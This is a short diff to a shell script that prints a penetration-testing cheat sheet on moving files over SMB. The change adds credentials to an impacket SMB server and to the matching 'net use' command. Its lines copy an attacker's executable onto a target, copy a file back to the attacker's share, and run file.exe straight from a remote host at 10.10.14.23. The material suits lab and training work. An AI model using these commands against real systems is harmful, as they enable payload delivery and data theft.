@@ -62,11 +62,10 @@ echo -e ""
 
 
 echo -e "${Frame}###${End} ${Title}Transfer Through SMB Server${End} ${Frame}###${End}"
-echo -e "${Point} impacket-smbserver share ."
-echo -e "    net use * \\\\\\$ip\share"
+echo -e "${Point} impacket-smbserver share . -username evil -password evil -smb2support"
+echo -e "    net use * \\\\\\$ip\share /u:evil evil"
 echo -e "    copy Z:\\\kali_to_target.exe"
 echo -e "    copy target_to_kali.txt Z:\\"
 echo -e "    \\\\\\10.10.14.23\\\share\\\file.exe ${Comment}# run executable${End}"
-
 
 
